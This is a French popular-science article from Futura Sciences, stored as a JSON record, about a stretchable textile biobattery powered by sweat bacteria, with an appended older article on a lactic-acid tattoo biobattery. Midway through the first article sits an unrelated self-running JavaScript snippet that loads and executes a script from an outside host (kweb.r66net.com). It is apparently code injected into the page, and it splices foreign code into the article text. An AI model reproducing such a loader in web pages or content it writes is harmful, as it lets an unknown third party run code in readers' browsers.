{"title": "Une biobatterie alimentée par la sueur", "newspaper": "Futura Sciences", "author": "Marc Zaffagni", "date_publi": "11/12/2017", "content": "Un chercheur de l'université de Binghamton (États-Unis) a créé une biobatterie sous la forme d'un tissu extensible qui fonctionne avec la sueur corporelle. Celle-ci pourrait un jour être incorporée dans des vêtements connectés pour les sportifs.  Si les vêtements connectés nous promettent monts et merveilles en matière d'interface et d'ergonomie, leur développement commercial est encore confidentiel. En témoigne la veste  Levi’s Commuter Trucker , codéveloppée avec Google, qui est chère et offre peu de fonctionnalités. L'un des principaux freins à l'essor de ces produits tient à l'intégration des composants électroniques indispensables et, surtout, au système d'alimentation. En effet, faire entrer une batterie qui soit à la fois discrète et suffisamment puissante dans un vêtement est une gageure à laquelle personne n'a encore trouvé de formule idéale. Bien entendu, des pistes existent dans les laboratoires du côté des  batteries flexibles , certaines s'inspirant de l' origami , cette technique de pliage japonaise. Des recherches ont également cours en ce qui concerne une source d'alimentation pouvant provenir du corps humain, plus précisément de la salive ou de la sueur. En effet, les bactéries contenues dans ces sécrétions peuvent provoquer une réaction redox (oxydoréduction) qui va faire circuler des  électrons  pour générer de l'électricité. C'est le principe de la pile à combustible microbienne, sur laquelle travaille notamment Seokheun Choi, un scientifique de l'université de Binghamton (États-Unis) ; nous avions déjà évoqué ses recherches sur les  batteries en origami  alimentées par des eaux usées. Partant de ces bases, il a développé une nouvelle biobatterie, cette fois-ci alimentée par la sueur corporelle. Cette batterie est incorporée dans un tissu extensible qui pourrait, à l'avenir, être utilisé pour fabriquer des vêtements connectés à usage sportif. La biobatterie microbienne incorporée dans un tissu extensible peut supporter les étirements répétés. © Seokheun Choi,  Binghamton University                               La biobatterie microbienne peut alimenter une LED pendant 20 minutes L'article consacré à cette nouvelle pile à combustible microbienne a été publié dans  Advanced Energy Materials . Seokheun Choi y explique que les performances sont équivalentes à celles de sa batterie microbienne en papier. Cette dernière pouvait délivrer 6,4 microwatts par cm². L' énergie  produite est suffisante pour alimenter une LED pendant 20 minutes.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  La biobatterie exploite la bactérie ubiquitaire  Pseudomonas aeruginosa  comme catalyseur. Sa fabrication repose sur une structure inédite pour une batterie dans la mesure où l' anode  et la cathode sont placées dans une seule chambre de réaction, sans membrane de séparation. L'anode conductrice et hydrophile se nourrit des bactéries présentes dans la sueur tandis que la cathode à l'état solide utilise de l'oxyde d'argent. Le chercheur indique que cette batterie s'est montrée à la fois stable et durable, malgré des déformations répétées du tissu. Le design particulier a l'avantage de faciliter grandement la production en série de ce type de biobatterie microbienne, ce qui laisse entrevoir des possibilités de fabrication standardisée pour l'industrie textile. Mais le chemin sera tout de même encore long avant d'en arriver là, notamment parce qu'il va falloir trouver le moyen de progresser au niveau de la puissance délivrée pour pouvoir alimenter les composants électroniques variés qui entrent dans la conception des vêtements connectés. Pour en savoir plus Une biobatterie rechargée par la transpiration corporelle Article initial de Marc Zaffagni, paru le 21/08/2014 Si l' acide lactique  est l'ennemi des sportifs, il a aussi des avantages. Des chercheurs de l'université de Californie, à San Diego, ont créé une biobatterie alimentée par la  transpiration  corporelle. Elle repose sur un  capteur  imprimé sous la forme d'un tatouage temporaire qui peut extraire des électrons de l'acide lactique pour produire un  courant électrique . À terme, ce système pourrait permettre d'alimenter de petits appareils électroniques. Faire de l'exercice pour entretenir sa santé est une excellente habitude. À l'avenir, cela pourrait même être encore plus bénéfique... Des chercheurs de l'université de Californie, à San Diego ( UCSD ), ont en effet mis au point un capteur imprimé sous forme d'un tatouage temporaire qui est capable de produire de l'énergie à partir de l'acide lactique présent dans la transpiration. Ils viennent de présenter leurs travaux lors de la réunion annuelle de  l’ American Chemical Society . Cette biobatterie fonctionne grâce à l'acide lactique que produit le corps humain lors d'exercices  physiques . Les sportifs portant un tel tatouage pourraient par exemple alimenter leur capteur biométrique (rythme cardiaque, podomètre, etc.), un  vêtement intelligent  et peut-être même des appareils électroniques comme les  smartphones . À l'origine, les chercheurs de l'UCSD avaient élaboré ce capteur d'acide lactique pour aider les sportifs à mieux gérer leurs sessions d'entraînement. Il mesurait le courant électrique produit durant les exercices et c'est en détectant les variations de ce courant qu'il était possible de surveiller les niveaux de cet acide et d'adapter l'intensité de l'effort. Les scientifiques ont ensuite fait évoluer cet outil pour créer une biobatterie. Dans le capteur, l'anode contient une  enzyme  qui va extraire des électrons de l'acide lactique et une anode qui contient une  molécule  qui accepte ces électrons. Le tout est capable de produire un courant électrique de faible intensité. À l’origine, le tatouage temporaire développé par les chercheurs de l’UCSD servait à mesurer le taux d’acide lactique pour aider les sportifs à mieux gérer leurs entraînements. Le système a ensuite été amélioré afin de pouvoir produire de l’énergie. © UCSD, YouTube                               Les sportifs occasionnels produisent plus d’énergie Pour tester la biobatterie, l'équipe de l'UCSD a fait appel à 15 volontaires auxquels ils ont apposé le tatouage sur le bras. Les candidats ont ensuite réalisé une session d'entraînement sur un vélo stationnaire. Les chercheurs ont alors constaté que les personnes les moins sportives produisaient plus d'énergie que celles qui pratiquaient une activité physique régulière (d'une à trois fois par semaine). Les plus accomplis s'entraînant plus de trois fois par semaine produisaient le moins d'énergie. L'explication de ce phénomène tient au fait que chez les personnes les moins en forme, la fatigue intervient plus rapidement et avec elle la production d'acide lactique. Le maximum d'énergie qu'ils produisent est de 70 microwatts par centimètre carré de peau. Mais les  électrodes  de la biobatterie ne mesurent que 2 x 3 millimètres et ne produisent actuellement que 4 microwatts. Cependant, les chercheurs pensent pouvoir augmenter sa capacité pour atteindre une dizaine de microwatts. Dans une vidéo de démonstration publiée sur  YouTube , ils annoncent que leur technologie pourrait un jour servir à des sportifs pour alimenter un capteur de rythme cardiaque, une montre ou d'autres objets connectés, voire même un  smartphone . Ce qu'il faut retenir Les piles à combustible microbiennes peuvent notamment être alimentées par la sueur corporelle. Un chercheur a réussi à intégrer une biobatterie microbienne dans un tissu extensible. Sa capacité électrique est encore modeste, mais elle ouvre une perspective intéressante pour l’alimentation des vêtements connectés. ", "theme": "tech"}